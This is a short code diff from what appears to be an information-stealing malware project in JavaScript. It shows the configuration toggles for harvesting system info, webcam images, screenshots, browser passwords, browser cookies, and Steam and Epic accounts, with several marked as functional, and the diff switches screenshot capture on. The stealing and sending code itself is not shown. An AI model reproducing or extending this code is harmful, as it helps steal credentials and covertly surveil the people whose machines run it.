@@ -1,10 +1,14 @@
 // suck my nuts, heres all the toggles
-let runOnStartupToggle = false; //TODO
+// try to keep these in order
+  // system info
+let runOnStartupToggle = false; //TODO (might move to a preloader)
 let sysInfoToggle = true; //FUNCTIONAL
 let webcamToggle = true; //FUNCTIONAL
-let screenshotToggle = false; //FUNCTIONAL
+let screenshotToggle = true; //FUNCTIONAL
+  // browser info
 let browserPassToggle = true; //FUNCTIONAL
 let browserCookieToggle = false; //TODO
+  // game info
 let steamToggle = false; //VERIFY
 let epicToggle = false; //VERIFY
 
@@ -51,11 +55,3 @@ fs.mkdir(DirectoryPath, { recursive: true })
     .catch((err) => {
       console.log(err);
     });
-
-//fs.mkdir(path.join(DirectoryPath, "Images"), {recursive: true}, (err) => {
-//    if (err) {
-//        console.error('Error creating directory: ', err);
-//    } else {
-//        console.log('Directory created successfully: ', path.join(DirectoryPath, "Images"));
-//    }
-//})
